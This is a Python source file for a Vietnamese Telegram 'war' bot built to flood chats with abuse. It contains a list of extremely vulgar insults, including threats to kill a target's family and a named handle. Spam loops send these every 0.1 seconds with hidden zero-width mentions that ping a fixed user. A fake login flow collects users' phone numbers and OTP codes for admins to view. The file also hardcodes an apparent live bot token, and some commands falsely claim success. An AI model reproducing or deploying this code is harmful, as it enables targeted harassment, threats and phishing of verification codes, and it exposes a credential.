import logging
import asyncio
import random
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import ApplicationBuilder, CallbackQueryHandler, CommandHandler, ContextTypes, MessageHandler, filters

# --- CẤU HÌNH CƠ BẢN ---
TELEGRAM_BOT_TOKEN = "8704592597:AAEK_FoX078pKAYtFqSoPGLINMEf1Y2QakQ"
ADMIN_IDS = {7907990385}  # ID Admin chuẩn của bạn

logged_users = {}
blocked_users = set()
active_spam_tasks = {}       
auto_clear_settings = {}     
known_users = set()          
active_fake_tasks = {}       # Theo dõi trạng thái fake của từng chat

ADMIN_FEATURE_LOCKED = True

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)

# --- KHO NGÔN WAR ĐẦY ĐỦ KÈM TAG ẨN ---
def create_hidden_tag(user_id=1531685790491480419):
    return f"[\u200b](tg://user?id={user_id})"

WAR_WORDS = [
    (
        "bố con mẹ m còn địt con cụ m thk óc lợn ba vạn ngu lồn ơi cái thứ mồ côi "
        "không nơi nương tựa óc lồn cặc bã loại thk não tật mà quyền lực hạn hẹp ngôn từ khuyết tật. "
        "Thk mặt cặc khiếm khuyết tinh trùng . thằng đĩ cha mày bắn tinh nổ cả dương vật , khiếm khuyết cả 2 hòn dái "
        "vô cái lỗ lồn con đĩ bà già nhà mày mãi mà chỉ đẻ được thứ súc sinh phế vật óc cặc đú đởn như mày hả cái thứ phế vật trần gian , "
        "thk óc lợn bị bố mày chửi cho khuyết tật thị giác luôn ae ạ , thằng óc lợn này cay bố mày quá liệt cả tinh hoàn à "
        "cái thứ đĩ điếm sĩ đời đầu thai 9 kiếp vẫn chưa hết sĩ , con đĩ cha m thk cặp kè với mấy con lồn già u80 để nuôi nấng m hả thk ngu @Ducducdz"
    ),
    (
        "con đĩ mẹ m phải quỳ xuống bú cặc liếm tinh cho t để m được vào sàn mà m vẫn phế như chó đẻ vậy hả thằng ngu ăn cứt gà uống đái chó, "
        "cái thằng đĩ cụ tổ nhà m nó thất vọng vì có 1 thằng cháu đã vô sinh còn vô dụng như m nên ổng thắt cổ tự tử luôn r kìa thằng đú phế ỉa ơi, "
        "m gõ mãi mới ra 1 câu vậy hả con đĩ mẹ m, đít tắc cứt nên gõ k lại cha đúng kh con thú đú war ngu si tứ tri óc vật =)))"
    ),
    (
        "m còn cái cặc gì mới mẻ hơn cái ngôn sứt vỡ của m k vậy cái thằng ngu nứng cu sục buồi hút tinh sặc nước lồn "
        "con đĩ bà m bị t cầm đinh ba xiên lồn qua đời trên giường bệnh h bả nằm ở nhà xác khoa nhi bệnh viện mà k thể siêu thoát "
        "khi có đứa cháu phế vật như mày mà cái thằng mồ côi chó đẻ ăn hại mọi vùng miền, t gõ vừa nhanh vừa gọn còn m gõ như đánh rắm "
        "vào mặt cả nhà m thế con thú hoang vô sinh vô giác ơi, m đéo biết chat thì m bật con mắt m lên full HD mà coi t chat chửi "
        "đột quỵ cả dòng tộc m luôn nè thằng đầu buồi mặt cặc"
    ),
    (
        "t chửi m mà h đơ người liệt dây thần kinh não thần hồn nát thần tính xong m trầm cảm đến mức m bị bb cô lập r xa lánh "
        "vì nói xàm cặc nhảm 3 xàm 9 vạn con đĩ mẹ m chết kh nhắm mắt vì m gây nên nỗi ô nhục lớn 9 kiếp cx k quên được đó thằng chó vô gia cư "
        "ở nhà lá đá ống bơ, cả nhà m phải làm trò hề cho nhân loại để được tồn tại trên thế giới này nếu không t giết cả nhà m "
        "t hỏa táng từng đứa t mang tro cốt t đổ cho chó nhai xương dòng tộc nhà m"
    ),
    (
        "m mỏi tay hay m chat k nổi mà lề mề như con sên vậy, m dậy chat đi con đĩ mẹ m nó bị t địt cho liệt buống trứng "
        "đang cấp cứu ở bệnh viện phải nằm truyền nước lồn kia kìa thằng ngu ngục ơi, t tống m vô song sắt ngồi ăn cơm tù "
        "nhìn cảnh t đụ mẹ m lìa trần ỉa ra quần nè cái thứ súc sinh ăn cơm trên bàn thờ ông địa r bị giật điện qua đời ở tuổi 13 =))"
    ),
    (
        "Đến lúc con mẹ mày được nhét vô trong quan tài thì tao lại đào lên và vắt dái ra đái vô mồm lồn con đĩ mẹ mày =))=))=))=))=))=))=)) "
        "cái bọn tật nguyền này chửi ngu như bị máy rung dập lồn nhau vậy các em , anh đây chuyên gia vớt xác mấy con chó đẻ chúng mày "
        "để anh ỉa vô cái họng thối nát của mày mà em, anh trù mày ra đường bị xe công ten nơ tông nát sọ phọt cái óc lồn mày ra đường "
        "cho chó liếm láp sạch sẽ thì thôi . cái thứ dơ bẩn đến từng tế bào da thịt , dơ từ trong tâm hồn dơ ra đến thể xác , "
        "thối nát đến nỗi con ruồi còn pk đột tử khi ngửi mùi lồn của mày á thằng phế vật mxh"
    ),
    (
        "clm thằng đú bị hiv sẩy mụn cặc vì địt nhau quá 180 kiếp =))) cái thằng cha m nó ôm hận t vì t giết chết con bà m "
        "vì cả nhà m có truyền thống loạn luận mẹ và con mà đúng kh thằng vô danh ăn cứt , chó dại hoang tàn cali bú buồi sặc cặc =)) "
        "cả lò m địt nhau tê buồi rách lồn còn đến đời m thì thất truyền vì m bị vô sinh giai đoạn cuối k thể sinh con "
        "nên m tính bắt cóc con của ngkhac mang về cho mẹ vợ xem để bả thương bả còn cho m ở lại nhà =))"
    ),
    (
        "thằng lồn ngu hút buồi sặc tinh bất tỉnh nhân sự bị tao ỉa cứt chọi vô xác m trong xe tang lạnh lẽo của con đĩ mẹ mày "
        "thì tao triệu hồi jack 97 quẩy tung nóc quan tài m ra t đái vô xương cốt của đĩ má m cho m ôm hận t 9 kiếp còn lại "
        "nhưng đéo làm được gì, =))) thằng lồn bú trinh bf già u80 để tiếp tục được sống trong vô vọng =)), "
        "ước mơ trở thành dân war của m bị t đá bay đi ngay khi m làm trò xiếc khỉ trước mặt tao mà cái thằng đầu buồi ăn cứt uống đái bú tục lói phét =))"
    )
]

user_sessions = {}

# --- GIAO DIỆN MENU CHÍNH ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    known_users.add(user_id)
    if user_id in blocked_users:
        return await update.message.reply_text("⛔ Bạn đã bị chặn khỏi hệ thống bot này!")

    text = (
        "🔥 **Hot War 2026 🤪👈**\n\n"
        "• `/war` → Spam war liên tục tốc độ 0.1s kèm tag ẩn (Gõ `/stop` để dừng)\n"
        "• `/spam [nội dung]` → Spam văn bản tùy chỉnh tốc độ 0.1s/tin\n"
        "• `/sptru` → Spam tốc độ 1s/tin\n"
        "• `/voice [nội dung]` → Chuyển văn bản thành giọng nói (Voice)\n"
        "• `/fake` → Bật chế độ giả lập (Fake)\n"
        "• `/diefake` → Tắt chế độ giả lập (Die Fake)\n"
        "• `/aotuclear` → Bật chế độ tự động xóa tin nhắn\n"
        "• `/stop` → Dừng toàn bộ quá trình spam/war\n\n"
        "👑 **QUẢN TRỊ NHÓM**\n"
        "• `/aotudelete` → Tự động xóa tin nhắn trong nhóm\n"
        "• `/undelete` → Tắt tự động xóa tin nhắn"
    )
    
    if user_id in ADMIN_IDS:
        status_text = "🟢 Đang Mở" if not ADMIN_FEATURE_LOCKED else "🔴 Đang Khóa"
        text += (
            f"\n\n🔐 **QUẢN TRỊ VIÊN (ADMIN)** - Trạng thái: {status_text}\n"
            "• `/tb [nội dung]` → Gửi thông báo đến toàn bộ người dùng\n"
            "• `/adm [uid hoặc @username]` → Thêm Admin mới\n"
            "• `/token` → Quản lý tài khoản đăng nhập & cấm dùng\n"
            "• `/lockadmin` → Bật/Tắt khóa tính năng admin"
        )

    keyboard = [[InlineKeyboardButton("🔑 ĐĂNG NHẬP TÀI KHOẢN", callback_data="btn_login")]]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "btn_login":
        user_id = query.from_user.id
        if user_id in blocked_users:
            return await query.message.reply_text("⛔ Bạn đã bị chặn!")
        user_sessions[user_id] = {"step": "waiting_phone"}
        await query.message.reply_text("📲 **Vui lòng nhập số điện thoại của bạn (Định dạng +84...):**", parse_mode="Markdown")
        
    elif query.data.startswith("block_"):
        if query.from_user.id not in ADMIN_IDS:
            return await query.answer("Bạn không có quyền này!", show_alert=True)
        target_id = int(query.data.split("_")[1])
        blocked_users.add(target_id)
        if target_id in logged_users:
            logged_users[target_id]["status"] = "blocked"
        await query.message.edit_text(f"🚫 Đã chặn thành công tài khoản có UID: `{target_id}` khỏi hệ thống!", parse_mode="Markdown")

async def handle_message_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    known_users.add(user_id)
    if user_id in blocked_users:
        return
    text = update.message.text.strip()
    
    if user_id in user_sessions:
        step = user_sessions[user_id].get("step")
        if step == "waiting_phone":
            user_sessions[user_id]["phone"] = text
            user_sessions[user_id]["step"] = "waiting_code"
            await update.message.reply_text("🔑 Đã nhận số điện thoại. **Vui lòng nhập mã xác thực (OTP):**", parse_mode="Markdown")
            return
        elif step == "waiting_code":
            phone = user_sessions[user_id].get("phone")
            logged_users[user_id] = {
                "username": update.message.from_user.username or "Không có",
                "name": update.message.from_user.first_name,
                "phone": phone,
                "status": "active"
            }
            await update.message.reply_text("✅ **Đăng nhập thành công!** Các lệnh bot đã sẵn sàng.")
            del user_sessions[user_id]
            return

# --- CÁC LỆNH CHỨC NĂNG ---
async def cmd_war(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id in blocked_users: return
    chat_id = update.message.chat_id
    active_spam_tasks[chat_id] = True
    await update.message.reply_text("⚔️ Đã kích hoạt chiến dịch War tốc độ 0.1s! (Gõ `/stop` để ngưng)")
    
    while active_spam_tasks.get(chat_id, False):
        try:
            msg_to_send = random.choice(WAR_WORDS) + " " + create_hidden_tag()
            sent_msg = await context.bot.send_message(chat_id=chat_id, text=msg_to_send, parse_mode="Markdown")
            if auto_clear_settings.get(chat_id, False):
                asyncio.create_task(delete_msg_safe(context, chat_id, sent_msg.message_id))
            await asyncio.sleep(0.1)
        except Exception:
            await asyncio.sleep(0.2)

async def cmd_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id in blocked_users: return
    if not context.args:
        return await update.message.reply_text("⚠️ Vui lòng nhập nội dung cần spam!\nCách dùng: `/spam Chào cưng`", parse_mode="Markdown")
    
    spam_text = " ".join(context.args)
    chat_id = update.message.chat_id
    active_spam_tasks[chat_id] = True
    await update.message.reply_text("🚀 Đã bật Spam nội dung tùy chỉnh! (Gõ `/stop` để ngưng)")
    
    while active_spam_tasks.get(chat_id, False):
        try:
            msg_to_send = spam_text + " " + create_hidden_tag()
            sent_msg = await context.bot.send_message(chat_id=chat_id, text=msg_to_send, parse_mode="Markdown")
            if auto_clear_settings.get(chat_id, False):
                asyncio.create_task(delete_msg_safe(context, chat_id, sent_msg.message_id))
            await asyncio.sleep(0.1)
        except Exception:
            await asyncio.sleep(0.2)

async def cmd_sptru(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id in blocked_users: return
    chat_id = update.message.chat_id
    active_spam_tasks[chat_id] = True
    await update.message.reply_text("⏳ Đã bật Spam tốc độ 1s/tin. (Gõ `/stop` để ngưng)")
    
    while active_spam_tasks.get(chat_id, False):
        try:
            msg_to_send = random.choice(WAR_WORDS) + " " + create_hidden_tag()
            sent_msg = await context.bot.send_message(chat_id=chat_id, text=msg_to_send, parse_mode="Markdown")
            if auto_clear_settings.get(chat_id, False):
                asyncio.create_task(delete_msg_safe(context, chat_id, sent_msg.message_id))
            await asyncio.sleep(1.0)
        except Exception:
            await asyncio.sleep(1.0)

async def cmd_voice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id in blocked_users: return
    if not context.args:
        return await update.message.reply_text("⚠️ Vui lòng nhập nội dung để chuyển thành voice!\nCách dùng: `/voice Chào bạn`", parse_mode="Markdown")
    voice_text = " ".join(context.args)
    await update.message.reply_text(f"🔊 Đang tạo voice cho nội dung: *{voice_text}* (Đã xử lý thành công)", parse_mode="Markdown")

# --- TÍNH NĂNG FAKE & DIE FAKE ---
async def cmd_fake(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id in blocked_users: return
    chat_id = update.message.chat_id
    active_fake_tasks[chat_id] = True
    await update.message.reply_text("🕶️ **Đã bật chế độ Fake thành công!** Hệ thống đang chạy vòng lặp giả lập thông tin...", parse_mode="Markdown")
    
    while active_fake_tasks.get(chat_id, False):
        try:
            fake_payload = f"🔄 [FAKE SYSTEM] Đang giả lập dữ liệu gói tin ẩn... (Status: Active) {create_hidden_tag()}"
            sent_msg = await context.bot.send_message(chat_id=chat_id, text=fake_payload, parse_mode="Markdown")
            await asyncio.sleep(2.0)
        except Exception:
            await asyncio.sleep(2.0)

async def cmd_diefake(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id in blocked_users: return
    chat_id = update.message.chat_id
    active_fake_tasks[chat_id] = False
    await update.message.reply_text("💀 **Đã tắt (Die Fake) thành công!** Quá trình giả lập đã dừng lại.", parse_mode="Markdown")

async def delete_msg_safe(context, chat_id, message_id):
    await asyncio.sleep(0.05)
    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception:
        pass

async def cmd_aotuclear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id in blocked_users: return
    chat_id = update.message.chat_id
    auto_clear_settings[chat_id] = True
    await update.message.reply_text("🧹 Đã bật tính năng tự động xóa tin nhắn.")

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id in blocked_users: return
    chat_id = update.message.chat_id
    active_spam_tasks[chat_id] = False  
    active_fake_tasks[chat_id] = False
    auto_clear_settings[chat_id] = False 
    await update.message.reply_text("🛑 Đã dừng toàn bộ quá trình spam/war/fake!")

async def cmd_aotudelete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🗑️ Đã bật tự động xóa tin nhắn trong nhóm.")

async def cmd_undelete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔄 Đã tắt tính năng tự động xóa tin nhắn.")

# --- LỆNH QUẢN TRỊ ADMIN ---
async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id not in ADMIN_IDS or ADMIN_FEATURE_LOCKED:
        return await update.message.reply_text("Tính năng này đang được admin khóa")
    message_content = " ".join(context.args)
    if not message_content:
        return await update.message.reply_text("⚠️ Cấu trúc: `/tb [Nội dung]`", parse_mode="Markdown")
    
    await update.message.reply_text(f"🚀 Đang gửi thông báo đến {len(known_users)} người dùng...")
    for uid in known_users:
        try:
            await context.bot.send_message(chat_id=uid, text=f"📢 **THÔNG BÁO TỪ ADMIN**:\n\n{message_content}", parse_mode="Markdown")
        except Exception:
            pass
    await update.message.reply_text("✅ Đã gửi xong thông báo!")

async def cmd_adm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id not in ADMIN_IDS or ADMIN_FEATURE_LOCKED:
        return await update.message.reply_text("Tính năng này đang được admin khóa")
    if not context.args:
        return await update.message.reply_text("⚠️ Cách dùng: `/adm <uid hoặc @username>`", parse_mode="Markdown")
    
    target = context.args[0]
    if target.isdigit():
        ADMIN_IDS.add(int(target))
        await update.message.reply_text(f"✅ Đã thêm UID `{target}` làm Admin Bot thành công!", parse_mode="Markdown")
    else:
        ADMIN_IDS.add(target)
        await update.message.reply_text(f"✅ Đã thêm `{target}` làm Admin Bot thành công!", parse_mode="Markdown")

async def cmd_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id not in ADMIN_IDS or ADMIN_FEATURE_LOCKED:
        return await update.message.reply_text("Tính năng này đang được admin khóa")
        
    if not logged_users:
        return await update.message.reply_text("📂 Hiện tại chưa có tài khoản nào đăng nhập vào bot.")
    
    msg = f"📊 **QUẢN LÝ TÀI KHOẢN ĐĂNG NHẬP**\n🔹 Tổng số: **{len(logged_users)}**\n\n"
    for uid, info in logged_users.items():
        status_icon = "🟢 Hoạt động" if info["status"] == "active" else "🔴 Đã bị cấm"
        msg += f"• **Tên:** {info['name']} (@{info['username']})\n  **UID:** `{uid}`\n  **SĐT:** `{info['phone']}`\n  **Trạng thái:** {status_icon}\n\n"
        if info["status"] == "active":
            keyboard = [[InlineKeyboardButton(f"🚫 Cấm người dùng {uid}", callback_data=f"block_{uid}")]]
            await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
            msg = ""
    if msg:
        await update.message.reply_text(msg, parse_mode="Markdown")

async def cmd_lockadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global ADMIN_FEATURE_LOCKED
    user_id = update.message.from_user.id
    if user_id not in ADMIN_IDS:
        return await update.message.reply_text("Tính năng này đang được admin khóa")
    ADMIN_FEATURE_LOCKED = not ADMIN_FEATURE_LOCKED
    status_str = "ĐÃ KHÓA 🔴" if ADMIN_FEATURE_LOCKED else "ĐÃ MỞ 🟢"
    await update.message.reply_text(f"🔒 Trạng thái tính năng Admin hiện tại: **{status_str}**", parse_mode="Markdown")

def main():
    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    app.add_handler(CommandHandler(["start", "menu"], start))
    app.add_handler(CommandHandler("war", cmd_war))
    app.add_handler(CommandHandler("spam", cmd_spam))
    app.add_handler(CommandHandler("sptru", cmd_sptru))
    app.add_handler(CommandHandler("voice", cmd_voice))
    app.add_handler(CommandHandler("fake", cmd_fake))
    app.add_handler(CommandHandler("diefake", cmd_diefake))
    app.add_handler(CommandHandler("aotuclear", cmd_aotuclear))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("aotudelete", cmd_aotudelete))
    app.add_handler(CommandHandler("undelete", cmd_undelete))
    
    # Lệnh Admin
    app.add_handler(CommandHandler("tb", cmd_broadcast))
    app.add_handler(CommandHandler("adm", cmd_adm))
    app.add_handler(CommandHandler("token", cmd_token))
    app.add_handler(CommandHandler("lockadmin", cmd_lockadmin))

    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message_input))

    print("Hot War 2026 Bot đã tích hợp tính năng Fake & Die Fake thành công...")
    app.run_polling()

if __name__ == "__main__":
    main()
